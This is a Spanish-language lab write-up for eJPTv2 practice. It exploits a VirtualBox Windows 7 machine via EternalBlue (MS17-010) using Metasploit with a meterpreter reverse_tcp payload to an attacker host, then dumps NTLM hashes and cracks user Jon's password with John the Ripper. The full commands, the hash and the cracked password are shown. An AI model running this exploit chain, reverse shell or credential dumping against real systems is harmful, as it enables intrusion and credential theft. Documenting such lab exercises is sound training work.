# 🪟 Informe de Laboratorio: Blue (Windows 7)

**IP Objetivo:** `192.168.1.38`
**Sistema Operativo:** Windows 7 Professional
**Fecha:** 14/04/2026
**Objetivo:** Explotación de EternalBlue y obtención de credenciales del usuario `Jon`.

---

## 🔍 Fase 1: Enumeración

**Detección de Host:**
```bash
arp-scan --localnet
IP Detectada: 192.168.1.38 (MAC: 08:00:27 - VirtualBox)

Escaneo de Puertos (Nmap):

bash
nmap -sV -p- 192.168.1.38
Puertos Críticos:

445/tcp (SMB): Microsoft Windows 7 - 10 microsoft-ds

💥 Fase 2: Explotación (EternalBlue - MS17-010)
Herramienta: Metasploit Framework

Comandos Utilizados:

bash
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.38
set LHOST 192.168.1.39
set PAYLOAD windows/x64/meterpreter/reverse_tcp
run
Resultado: Sesión de Meterpreter abierta con privilegios NT AUTHORITY\SYSTEM.

🚀 Fase 3: Post-Explotación
Volcado de Hashes NTLM:

bash
meterpreter > hashdump
Hash Obtenido (Usuario Jon): ffb43f0de35be4d9917ac0cc8ad57f8d

Crackeo de Contraseña:

Herramienta: John the Ripper

Comando: john --format=NT hash_jon.txt --wordlist=/usr/share/wordlists/rockyou.txt

Resultado: alqfna22 (Crackeado en < 1 segundo).

Verificación de Acceso: Inicio de sesión exitoso en el escritorio de Windows 7 como Jon.

🧠 Lecciones Aprendidas
Conectividad: El modo "Adaptador Puente" es esencial para que Kali y la víctima se vean en una red WiFi real.

Identificación de VM: Las direcciones MAC que empiezan por 08:00:27 pertenecen a VirtualBox.

Eficiencia de Crackeo: Los hashes NTLM sin "Salt" son extremadamente rápidos de romper con diccionarios modernos.

Evidencia: El hashdump y la posterior validación en escritorio son pruebas irrefutables de compromiso total.

Informe realizado como parte de la preparación para la certificación eJPTv2.